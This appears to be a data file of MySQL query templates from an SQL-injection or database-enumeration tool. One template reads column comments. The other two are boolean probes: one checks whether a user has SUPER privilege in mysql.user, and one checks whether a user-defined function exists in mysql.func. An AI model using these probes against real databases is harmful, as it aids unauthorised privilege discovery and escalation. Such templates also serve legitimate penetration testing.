SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='{!table_name}' AND table_name='{!table_name}' AND column_name='{!column_name}'
(SELECT super_priv FROM mysql.user WHERE user='{!user_name}' LIMIT 0,1)='Y'
(SELECT name FROM mysql.func WHERE name='{!user_name}' LIMIT 0,1)='{RANDSTR}'
